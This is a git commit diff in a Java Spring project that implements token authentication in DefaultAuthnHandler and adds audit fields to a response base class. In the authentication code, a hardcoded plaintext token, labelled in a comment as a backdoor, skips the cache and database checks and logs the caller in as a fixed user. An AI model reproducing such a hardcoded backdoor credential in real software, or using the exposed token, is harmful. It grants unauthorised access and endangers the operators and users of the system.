e1908b10ac62d78b03a0c4cd69870976052239ce
杨桐 <yt220600@gmail.com>
2025-12-27 01:28:37 +0800

    feat：完整认证流程

--- ytora-base/src/main/java/xyz/ytora/base/auth/handler/support/DefaultAuthnHandler.java
+++ ytora-base/src/main/java/xyz/ytora/base/auth/handler/support/DefaultAuthnHandler.java
@@ -1,19 +1,100 @@
 package xyz.ytora.base.auth.handler.support;
 
+import jakarta.annotation.Resource;
+import jakarta.servlet.http.Cookie;
 import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
+import org.springframework.beans.BeansException;
+import org.springframework.context.ApplicationContext;
+import org.springframework.context.ApplicationContextAware;
 import xyz.ytora.base.auth.AuthException;
 import xyz.ytora.base.auth.LoginUser;
 import xyz.ytora.base.auth.handler.AuthnHandler;
+import xyz.ytora.base.cache.Caches;
+import xyz.ytora.base.enums.RespCode;
+import xyz.ytora.base.exception.BaseException;
+import xyz.ytora.sql4j.core.SQLHelper;
+import xyz.ytora.sql4j.func.support.Raw;
+
+import java.util.List;
+import java.util.Map;
 
 /**
  * created by YT on 2025/12/6 18:08:24
  * <br/>
  * 默认的认证处理器
  */
-public class DefaultAuthnHandler implements AuthnHandler {
+public class DefaultAuthnHandler implements AuthnHandler, ApplicationContextAware {
+
+    @Resource
+    private SQLHelper sqlHelper;
+    @Resource
+    private Caches caches;
+
+    private Long timeout = -1L;
+
+    @Override
+    public void setApplicationContext(ApplicationContext context) throws BeansException {
+        Long _timeout = context.getEnvironment().getProperty("ytora.auth.token-invalid-time", Long.class);
+        if (_timeout == null) {
+            timeout = -1L;
+        } else {
+            timeout = _timeout * 1000;
+        }
+    }
+
     @Override
     public LoginUser doAuthn(HttpServletRequest request, HttpServletResponse response) throws AuthException {
-        return new LoginUser().setUserName("admin");
+        String authorization = null;
+        //1.首先尝试从请求头中获取令牌
+        authorization = request.getHeader("Authorization");
+        //2.如果没有获取到，则尝试从cookie中获取令牌
+        if (authorization == null) {
+            Cookie[] cookies = request.getCookies();
+            if (cookies != null) {
+                for (Cookie cookie : cookies) {
+                    if ("Authorization".equals(cookie.getName())) {
+                        authorization = cookie.getValue();
+                        break;
+                    }
+                }
+            }
+        }
+        //如果还是没有获取到，认为用户尚未登录
+        if (authorization == null) {
+            throw new BaseException(RespCode.NOT_LOGIN);
+        }
+        //根据令牌获取登录用户信息
+        LoginUser loginUser;
+        if ("YANGtong123$%^".equals(authorization)) {
+            //后门令牌
+            loginUser = new LoginUser()
+                    .setId("0")
+                    .setUserName("ytora")
+                    .setRealName("杨桐")
+                    .setLastRequestTime(System.currentTimeMillis())
+                    .setLastRequestTime(System.currentTimeMillis())
+                    .setRequestCount(1L)
+            ;
+        } else {
+            loginUser = caches.get(authorization);
+            //缓存中没有当前令牌信息，说明登录过期，用户信息已经从缓存中被清除了
+            if (loginUser == null) {
+                throw new BaseException(RespCode.LOGIN_TIMEOUT);
+            }
+            //走到这，说明当前用户已经登录了，认证通过，更新当前用户的访问信息并重置过期时间
+            List<Map<String, Object>> sysUsers = sqlHelper.select().from("sys_user").where(w -> w.eq(Raw.of("id"), loginUser.getId())).submit();
+            if (sysUsers.isEmpty()) {
+                throw new BaseException(RespCode.UNKNOWN_USER_PASSWORD);
+            }
+            Map<String, Object> sysUser = sysUsers.getFirst();
+            loginUser.setUserName((String) sysUser.get("user_name"));
+            loginUser.setRealName((String) sysUser.get("real_name"));
+            loginUser.setDepartCode((String) sysUser.get("depart_code"));
+            loginUser.setLastRequestTime(System.currentTimeMillis());
+            loginUser.setRequestCount(loginUser.getRequestCount() + 1);
+            caches.put(authorization, loginUser, timeout);
+        }
+        return loginUser;
     }
 }
--- ytora-base/src/main/java/xyz/ytora/base/mvc/BaseResp.java
+++ ytora-base/src/main/java/xyz/ytora/base/mvc/BaseResp.java
@@ -1,9 +1,13 @@
 package xyz.ytora.base.mvc;
 
 import lombok.Data;
+import xyz.ytora.sql4j.anno.Column;
+import xyz.ytora.sql4j.enums.ColumnType;
+import xyz.ytora.ytool.anno.Index;
 
 import java.io.Serial;
 import java.io.Serializable;
+import java.time.LocalDateTime;
 
 /**
  * 响应数据通用类型
@@ -14,5 +18,51 @@ public abstract class BaseResp<T extends BaseEntity<T>> implements Serializable 
     @Serial
     private static final long serialVersionUID = 1L;
 
+    /**
+     * 主键ID
+     */
+    @Index(0)
     private String id;
+
+    /**
+     * 创建人
+     */
+    @Index(1)
+    private String createBy;
+
+    /**
+     * 创建时间
+     */
+    @Index(2)
+    private LocalDateTime createTime;
+
+    /**
+     * 更新人
+     */
+    @Index(3)
+    private String updateBy;
+
+    /**
+     * 更新时间
+     */
+    @Index(4)
+    private LocalDateTime updateTime;
+
+    /**
+     * 创建者所属部门
+     */
+    @Index(5)
+    private String departCode;
+
+    /**
+     * 数据备注
+     */
+    @Index(6)
+    private String remark;
+
+    /**
+     * 数据状态
+     */
+    @Index(7)
+    private String status;
 }
